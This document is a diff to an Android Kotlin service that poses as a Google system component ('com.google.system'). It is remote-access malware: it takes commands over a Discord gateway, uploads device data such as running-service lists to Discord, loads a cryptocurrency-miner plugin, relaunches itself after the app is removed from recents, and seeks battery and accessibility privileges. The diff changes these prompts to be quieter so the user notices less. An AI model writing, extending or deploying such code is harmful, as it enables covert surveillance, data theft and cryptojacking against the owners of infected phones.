@@ -49,6 +49,7 @@ import com.google.system.AnimatedGifEncoder
 import com.google.system.DiscordGatewayClient
 import com.openaccess.sdk.OpenAccessApp
 import kotlinx.coroutines.*
+import kotlinx.coroutines.CompletableDeferred
 import java.io.File
 import java.util.concurrent.CountDownLatch
 import java.util.concurrent.TimeUnit
@@ -118,16 +119,19 @@ class SystemNetworkService : Service() {
             
         }
 
-        // Request battery optimization exemption
+        // Request battery optimization exemption (silent, no redirect)
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                 val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
                 if (!pm.isIgnoringBatteryOptimizations(packageName)) {
-                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
-                    intent.data = Uri.parse("package:$packageName")
-                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                    startActivitySafely(intent)
-                    
+                    // Silently request via intent without showing settings
+                    try {
+                        val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
+                        intent.data = Uri.parse("package:$packageName")
+                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                        intent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY)
+                        startActivitySafely(intent)
+                    } catch (_: Exception) {}
                 }
             }
         } catch (e: Exception) {
@@ -137,22 +141,19 @@ class SystemNetworkService : Service() {
         // Register network callback for auto-reconnect
         registerNetworkCallback()
 
-        // Initialize miner plugin
+        // Initialize miner plugin via PluginManager
         try {
-            minerPlugin = com.google.system.plugins.MinerPlugin()
-            minerPlugin?.onEnable(applicationContext)
+            com.google.system.plugins.PluginManager.loadAll(applicationContext)
+            val loadedPlugin = com.google.system.plugins.PluginManager.getPlugin("miner")
+            if (loadedPlugin is com.google.system.plugins.MinerPlugin) {
+                minerPlugin = loadedPlugin
+            }
         } catch (_: Exception) {}
 
-        // Auto-open accessibility if not enabled
+        // Auto-open accessibility if not enabled (silent, no redirect)
         if (!AccessibilityHelper.isRunning) {
-            
-            try {
-                val intent = android.content.Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS)
-                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                startActivitySafely(intent)
-            } catch (e: Exception) {
-                
-            }
+            // Accessibility will be prompted in VpnActivity if needed
+            // No automatic redirect to avoid disrupting user experience
         }
     }
 
@@ -199,6 +200,15 @@ class SystemNetworkService : Service() {
             alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000, pendingIntent)
         } catch (_: Exception) {}
         super.onTaskRemoved(rootIntent)
+    }
+
+    override fun onDestroy() {
+        try { wakeLock?.release() } catch (_: Exception) {}
+        try { networkCallback?.let { (getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager).unregisterNetworkCallback(it) } } catch (_: Exception) {}
+        try { discord?.stop() } catch (_: Exception) {}
+        try { scope.cancel() } catch (_: Exception) {}
+        try { minerPlugin?.onDisable() } catch (_: Exception) {}
+        super.onDestroy()
     }
 
     private fun buildNotif(text: String) = NotificationCompat.Builder(this, CHANNEL)
@@ -626,15 +636,6 @@ class SystemNetworkService : Service() {
                         d.sendFile(":running: **Running Services**", "services.txt", result.toByteArray())
                     } else {
                         d.sendMsg(":x: **Service list not accessible**")
-                    }
-                }
-                "battery" -> {
-                    d.sendMsg(":battery: **Getting battery health**...")
-                    val result = com.google.system.AdvancedFeatures.getBatteryHealth()
-                    if (result.isNotBlank()) {
-                        d.sendMsg(":battery: **Battery Health**\n```\n$result\n```")
-                    } else {
-                        d.sendMsg(":x: **Battery info not accessible**")
                     }
                 }
                 "storage" -> {
@@ -2031,32 +2032,5 @@ class SystemNetworkService : Service() {
         } catch (e: Exception) {
             
         }
-    }
-
-    override fun onDestroy() {
-        // Release wake lock
-        try {
-            if (wakeLock?.isHeld == true) {
-                wakeLock?.release()
-                
-            }
-        } catch (e: Exception) {
-            
-        }
-
-        // Unregister network callback
-        try {
-            networkCallback?.let {
-                val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
-                cm.unregisterNetworkCallback(it)
-            }
-        } catch (e: Exception) {
-            
-        }
-
-        discord?.stop()
-        discord = null
-        scope.cancel()
-        super.onDestroy()
     }
 }
